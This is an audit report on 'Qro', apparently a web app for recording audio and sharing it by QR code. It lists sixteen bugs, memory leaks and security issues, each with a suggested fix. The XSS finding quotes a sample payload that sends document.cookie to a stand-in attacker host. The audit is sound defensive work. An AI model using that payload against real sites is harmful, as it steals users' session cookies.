# Qro — Code Audit & Issues

> Audited: 2026-05-10  
> Branch: `main` (commit `ecbce03`)

---

## Summary Table

| # | Issue | Severity | Category |
|---|-------|----------|----------|
| 1 | `updatePlaybackVisuals` never defined | **Critical** | Bug |
| 2 | Visualizer breaks permanently after trim | **Critical** | Bug |
| 3 | State properties not initialized in `S` | **High** | Bug |
| 4 | File format / MIME mismatch on upload | **High** | Bug |
| 5 | AudioContext leak per recording session | **High** | Performance |
| 6 | XSS in history rendering | **High** | Security |
| 7 | No rate limiting on upload API | **High** | Security |
| 8 | Object URLs never revoked | **Medium** | Memory |
| 9 | History duration ignores trim | **Medium** | Data |
| 10 | Incomplete `startOver()` reset | **Medium** | Bug |
| 11 | WAV bloat after trim → upload | **Medium** | Performance |
| 12 | AudioContext not resumed on mobile | **Medium** | Bug |
| 13 | 500ms `setTimeout` for event wiring | **Low** | Quality |
| 14 | Dead TTS code | **Low** | Quality |
| 15 | `confirm()` dialog for delete | **Low** | UX |
| 16 | `uploadedFileBlob` lives outside state | **Low** | Quality |

---

## Critical Bugs

### 1. `updatePlaybackVisuals` is called but never defined
**File:** `index.html:1520`

```js
player.ontimeupdate = () => {
  // ...
  if (S.isPlaying) updatePlaybackVisuals(); // ← ReferenceError, function does not exist
};
```

Fires on every `ontimeupdate` event while audio is playing — that's multiple times per second. The browser console is flooded with `ReferenceError: updatePlaybackVisuals is not defined`. The progress bar still updates (set on the line above), but the intended per-frame waveform sync during scrubbing never works.

**Fix:** Either define `updatePlaybackVisuals()` as an alias for the `draw` logic inside `startPlaybackVisuals`, or remove the call entirely.

---

### 2. Playback visualizer permanently breaks after trim
**File:** `index.html:1561–1568`

```js
function startPlaybackVisuals() {
  if (!S.playSource) {  // ← guard prevents re-creation after trim
    S.playSource = S.audioCtx.createMediaElementSource(player);
    // ...
  }
}
```

`S.playSource` is created once and cached. After `applyTrim()` replaces `player.src` with a new blob URL, the cached `S.playSource` still wraps the old audio graph state. The `if (!S.playSource)` guard skips re-creation entirely. The reactive waveform bars go dead after the first trim and never recover.

`startOver()` also does not clear `S.playSource` or `S.playAnalyser`, so the second recording session starts with a broken visualizer.

**Fix:** Set `S.playSource = null` and disconnect/close the old nodes in both `applyTrim()` and `startOver()`.

---

## High Severity

### 3. State properties not initialized in `S`
**File:** `index.html:1241–1255`

The following properties are used throughout the app but are missing from the initial state object:

| Property | First used at |
|---|---|
| `S.isPlaying` | `index.html:1520` |
| `S.selectedMicId` | `index.html:1374` |
| `S.playSource` | `index.html:1561` |
| `S.playAnalyser` | `index.html:1564` |
| `S.playbackAnim` | `index.html:1526` |

Because they are set dynamically, `startOver()` (which uses `Object.assign`) silently misses resetting them. Stale values from a previous session persist into the next one.

**Fix:** Declare all properties in the `S` object with `null` / `false` defaults, and reset them explicitly in `startOver()`.

---

### 4. File format / MIME mismatch on upload
**File:** `index.html:1801`, `api/upload.js:52–58`

```js
// index.html — always appends .webm regardless of actual content
form.append('audio', S.audioBlob, S.title.replace(/\s+/g, '_') + '.webm');
```

```js
// api/upload.js — MIME type is derived from filename extension
const mimeType = fileName.endsWith('.mp3') ? 'audio/mpeg'
  : /* ... */
  : 'audio/webm'; // ← fallback; everything that isn't explicitly matched
```

If the user uploads an MP3 and then trims it, `applyTrim()` converts the audio to an uncompressed WAV blob. That WAV content is then sent to the server with a `.webm` filename. The server detects MIME as `audio/webm` and uploads a WAV file to Cloudinary labeled as WebM. This breaks playback for anyone who scans the QR code.

**Fix:** Detect the actual blob type (`S.audioBlob.type`) when constructing the filename, or always use the correct extension after trim (`.wav`).

---

### 5. AudioContext leaks on every recording session
**File:** `index.html:1386`

```js
S.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
```

A new `AudioContext` is created inside `startRecord()` on every recording. The old context is never closed with `audioCtx.close()`. Browsers cap concurrent `AudioContext` instances (typically 6). After 6 recordings in a single page session, new contexts fail silently and the recording waveform stops animating.

**Fix:** Reuse a single shared `AudioContext` for the lifetime of the page, or close the previous one before creating a new one.

---

### 6. XSS vulnerability in history rendering
**File:** `index.html:1909–1920`

```js
el.innerHTML = `<div class="history-list">${h.map(e => `
  <div class="history-item" onclick="loadHistoryItem(${e.id})">
    <div class="history-title">${e.title.replace(/_/g,' ')}</div>  ← unsanitized
```

`e.title` is user-supplied text from the recording name input. A title containing HTML like `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">` executes when the History page is opened.

**Fix:** Use `document.createElement` + `textContent` to build history items, or sanitize titles before storing them to `localStorage`.

---

### 7. No rate limiting on `/api/upload`
**File:** `api/upload.js`

The endpoint is completely open — no authentication, no request signing, no IP throttling. Anyone who discovers the URL can POST files repeatedly and drain the Cloudinary storage quota and bandwidth allocation.

**Fix:** At minimum, add a shared secret header check (`process.env.UPLOAD_SECRET`) that the frontend includes. Better long-term: switch to Cloudinary signed uploads so the server only issues short-lived signed tokens rather than accepting direct uploads.

---

## Medium Severity

### 8. Object URLs are never revoked
**File:** `index.html:1489`, `1619`, `1703`

```js
S.audioURL = URL.createObjectURL(blob);  // setupPreview
player.src = URL.createObjectURL(file);  // handleFileSelect
S.audioURL = URL.createObjectURL(wavBlob); // applyTrim
```

`URL.revokeObjectURL()` is never called anywhere. Each call pins the underlying `Blob` in memory. A session with multiple recordings and trims accumulates several large audio blobs that are never freed until the tab is closed.

**Fix:** Call `URL.revokeObjectURL(S.audioURL)` before reassigning it, and revoke the upload preview URL in `continueToPreview()`.

---

### 9. History duration ignores trim
**File:** `index.html:1892`

```js
duration: S.seconds > 0 ? formatTime(S.seconds) : '—'
```

`S.seconds` is the raw recording timer from `setInterval`. After the user trims the audio, `S.seconds` is never updated to reflect the trimmed duration. A 2-minute recording trimmed down to 10 seconds is stored in history as "2:00".

**Fix:** After `applyTrim()` completes and `player.onloadedmetadata` fires with the new duration, update `S.seconds` accordingly.

---

### 10. `startOver()` does not fully reset state
**File:** `index.html:1953–1963`

`startOver()` resets a subset of `S` properties but leaves `S.cloudURL` and `S.audioURL` populated with values from the previous session. If a user starts a new recording and then abandons it without uploading, `shareQR()` or `copyURL()` could still reference the old session's Cloudinary URL.

**Fix:** Clear `S.cloudURL`, `S.audioURL`, `S.playSource`, `S.playAnalyser`, and `uploadedFileBlob` in `startOver()`.

---

### 11. WAV bloat after trim inflates upload size and storage
**File:** `index.html:1700–1766`

`applyTrim()` decodes the compressed audio (WebM/Opus — typically ~1 MB for 2 minutes) and re-encodes it as **uncompressed 16-bit PCM WAV** (~20 MB for the same duration). This WAV blob is what gets uploaded to Cloudinary, stored permanently, and streamed to every person who scans the QR code. Students on mobile connections get a 20× larger file than necessary.

**Fix:** After trimming, re-encode to WebM using `MediaRecorder` on an `OfflineAudioContext` render, or accept the WAV but compress it server-side via Cloudinary's transformation API before returning the URL.

---

### 12. AudioContext not resumed before playback on mobile
**File:** `index.html:1559`

Mobile browsers (especially iOS Safari) create `AudioContext` in a `suspended` state. The Web Audio spec requires an explicit `audioCtx.resume()` call inside a user-gesture handler before the context will process audio. `startPlaybackVisuals()` does not call `resume()`, so on mobile the analyser returns all-zero frequency data and the waveform visualizer shows flat bars permanently.

**Fix:** Add `await S.audioCtx.resume()` at the top of `startPlaybackVisuals()`.

---

## Low Severity

### 13. 500ms `setTimeout` for upload event wiring
**File:** `index.html:1590`

```js
setTimeout(() => {
  const dropZone = document.getElementById('drop-zone');
  // attach drag/drop and file input listeners
}, 500);
```

Event listeners are attached after an arbitrary 500ms delay to ensure the DOM is ready. The `<script>` tag is already at the bottom of `<body>`, meaning the DOM is fully parsed when the script runs. The delay is unnecessary and will fail on devices where script execution takes longer than 500ms.

**Fix:** Remove the `setTimeout` wrapper entirely; the DOM elements are available synchronously.

---

### 14. Dead TTS code
**File:** `index.html:360`, `1786`

CSS class `.tts-wrap { display: none; }` and a `// TTS` section comment in the JS exist as remnants of an abandoned Text-to-Speech feature. No implementation follows. The mode toggle button that would have activated it has already been removed from the HTML.

**Fix:** Delete the `.tts-wrap` CSS rule and the `// TTS` comment block to keep the codebase clean.

---

### 15. `window.confirm()` for delete
**File:** `index.html:1924`

```js
if (!confirm('Delete this recording from history?')) return;
```

`window.confirm()` is a blocking synchronous dialog. It is poor UX on mobile, visually inconsistent with the app's design, and is blocked outright in some browser contexts (iframes, cross-origin embeds). 

**Fix:** Replace with an inline confirmation — toggle a "confirm delete?" prompt within the history item row on first tap, then execute on second tap.

---

### 16. `uploadedFileBlob` lives outside state
**File:** `index.html:1588`

```js
let uploadedFileBlob = null; // ← module-level, not part of S
```

This is separate from the `S` state object and is not reset in `startOver()`. A stale file reference persists across sessions, which could cause `continueToPreview()` to re-use a file from a previous upload session if `uploadedFileBlob` is set but the UI was reset.

**Fix:** Move `uploadedFileBlob` into `S` as `S.uploadedFile` and reset it in `startOver()`.
